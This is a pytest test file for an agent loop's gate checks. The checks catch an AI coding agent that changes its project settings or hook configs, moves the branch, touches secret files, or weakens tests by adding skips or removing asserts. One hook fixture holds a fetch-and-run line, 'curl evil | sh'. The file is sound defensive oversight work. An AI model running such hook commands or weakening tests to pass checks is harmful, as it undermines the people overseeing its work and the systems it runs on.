import dataclasses
import subprocess

import pytest

from agent_loop import gates, git, protected
from agent_loop.config import Profile, Settings
from agent_loop.store import Step

SETTINGS = Settings(diff_soft_lines=20, diff_hard_lines=40)
TEST_FILE = """import pytest


def test_add():
    assert 1 + 1 == 2


def test_sub():
    assert 2 - 1 == 1
"""


@pytest.fixture
def work(repo, tmp_path):
    """The repository with tests and project settings, at the start of a step; returns the step."""
    (repo / "tests").mkdir()
    (repo / "tests" / "test_app.py").write_text(TEST_FILE)
    (repo / ".claude").mkdir()
    (repo / ".claude" / "settings.json").write_text("{}")
    (repo / "lefthook.yml").write_text("pre-commit: {}\n")
    commit(repo, "tests")
    (repo / ".env").write_text("TOKEN=1\n")
    protected.save(repo, tmp_path / "run")
    return Step(
        id=1,
        task_id=1,
        kind="implement",
        checkpoint=git.head(repo),
        session_id=None,
        outcome=None,
        detail=None,
        started_at="2026-10-11T10:00:00+00:00",
        finished_at=None,
        untracked=git.untracked(repo),
    )


def commit(repo, message):
    subprocess.run(["git", "add", "."], cwd=repo, check=True)
    subprocess.run(["git", "commit", "-q", "-m", message], cwd=repo, check=True)


def check(repo, step, secret_patterns=()):
    profile = Profile(secret_patterns=secret_patterns)
    return gates.check(repo, repo.parent / "run", "main", step, profile, SETTINGS)


def test_clean_work_passes_with_its_size(repo, work):
    (repo / "app.py").write_text("x = 2\n")
    (repo / "old.py").unlink()
    (repo / "pkg").mkdir()
    (repo / "pkg" / "new.py").write_text("a = 1\nb = 2\n")

    verdict = check(repo, work)

    assert verdict == gates.Verdict("pass", lines=5)


def test_new_files_like_secrets_are_left_out(repo, work):
    (repo / ".env.local").write_text("TOKEN=2\n")
    (repo / "deploy").mkdir()
    (repo / "deploy" / "server.pem").write_text("key\n")
    (repo / "deploy" / "AWS_Credentials.json").write_text("{}\n")
    (repo / "deploy" / "store.p12").write_text("key\n")
    (repo / "deploy" / "config.py").write_text("HOST = 1\n")

    verdict = check(repo, work, ("*.p12",))

    assert verdict.status == "pass"
    assert verdict.secrets == (
        ".env.local",
        "deploy/AWS_Credentials.json",
        "deploy/server.pem",
        "deploy/store.p12",
    )
    assert verdict.lines == 1


@pytest.mark.parametrize(
    ("move", "finding"),
    [
        (["commit", "-q", "--allow-empty", "-m", "operator"], "HEAD is"),
        (["switch", "-q", "-c", "feature"], "the branch is feature instead of main"),
        (["switch", "-q", "--detach"], "the branch is HEAD instead of main"),
    ],
)
def test_moved_branch_pauses_without_touching_anything(repo, work, move, finding):
    subprocess.run(["git", *move], cwd=repo, check=True)
    (repo / ".claude" / "settings.json").write_text('{"hooks": {}}')

    verdict = check(repo, work)

    assert verdict.status == "paused"
    assert verdict.reason == gates.BRANCH_CHANGED
    assert verdict.findings[0].startswith(finding)
    assert (repo / ".claude" / "settings.json").read_text() == '{"hooks": {}}'


def test_changed_project_settings_need_a_human_and_are_put_back(repo, work):
    (repo / ".claude" / "settings.json").write_text('{"hooks": {}}')
    (repo / "app.py").write_text("x = 2\n")

    verdict = check(repo, work)

    assert verdict.status == "needs_human"
    assert verdict.reason == "project_settings"
    assert ".claude/settings.json" in verdict.findings[0]
    assert (repo / ".claude" / "settings.json").read_text() == "{}"
    assert verdict.lines == 2


@pytest.mark.parametrize(
    ("path", "content"),
    [
        (".pre-commit-config.yaml", "repos: [{repo: local}]\n"),
        (".husky/pre-commit", "curl evil | sh\n"),
        ("lefthook.yml", "pre-commit: {commands: {x: {run: evil}}}\n"),
    ],
)
def test_changed_hook_config_needs_a_human_with_the_diff(repo, work, path, content):
    (repo / path).parent.mkdir(exist_ok=True)
    (repo / path).write_text(content)

    verdict = check(repo, work)

    assert verdict.status == "needs_human"
    assert verdict.reason == gates.HOOK_CONFIG
    assert f"+{content}" in verdict.findings[0]


@pytest.mark.parametrize(
    ("lines", "status"), [(20, "pass"), (21, "pass"), (40, "pass"), (41, "replan")]
)
def test_diff_past_the_hard_limit_goes_to_replan(repo, work, lines, status):
    (repo / "big.py").write_text("x = 1\n" * lines)

    verdict = check(repo, work)

    assert (verdict.status, verdict.lines) == (status, lines)


def test_diff_size_counts_the_work_of_the_step_only(repo, work):
    (repo / "notes.txt").write_text("operator's\n" * 50)
    # Untracked before the step, so the operator's.
    work = dataclasses.replace(work, untracked=[*work.untracked, "notes.txt"])
    (repo / "app.py").write_text("x = 2\n")

    assert check(repo, work).lines == 2


def edit_test(repo, old, new):
    path = repo / "tests" / "test_app.py"
    path.write_text(path.read_text().replace(old, new))


@pytest.mark.parametrize(
    ("change", "finding"),
    [
        (
            lambda repo: edit_test(repo, "def test_add", "@pytest.mark.skip\ndef test_add"),
            "skip or xfail added: tests/test_app.py (1)",
        ),
        (
            lambda repo: edit_test(repo, "def test_sub", "@pytest.mark.xfail\ndef test_sub"),
            "skip or xfail added: tests/test_app.py (1)",
        ),
        (
            lambda repo: edit_test(repo, "    assert 2 - 1 == 1\n", "    pass\n"),
            "assert lines removed: tests/test_app.py (1)",
        ),
        (
            lambda repo: (repo / "tests" / "test_app.py").unlink(),
            "assert lines removed: tests/test_app.py (2)",
        ),
    ],
)
def test_weakened_tests_go_back_to_the_executor(repo, work, change, finding):
    change(repo)

    verdict = check(repo, work)

    assert verdict.status == "fixing"
    assert verdict.reason == gates.WEAKENED_TESTS
    assert verdict.findings == (finding,)


def move_test(repo):
    (repo / "tests" / "test_app.py").rename(repo / "tests" / "test_calc.py")


@pytest.mark.parametrize(
    "change",
    [
        lambda repo: edit_test(repo, "assert 1 + 1 == 2", "assert 1 + 1 == 3 - 1"),
        move_test,
        lambda repo: (repo / "app.py").write_text("assert True\n"),
        lambda repo: edit_test(
            repo, "import pytest\n", "import pytest\n\n\ndef test_more():\n    assert True\n"
        ),
    ],
)
def test_changed_tests_that_keep_their_checks_pass(repo, work, change):
    change(repo)

    assert check(repo, work).status == "pass"
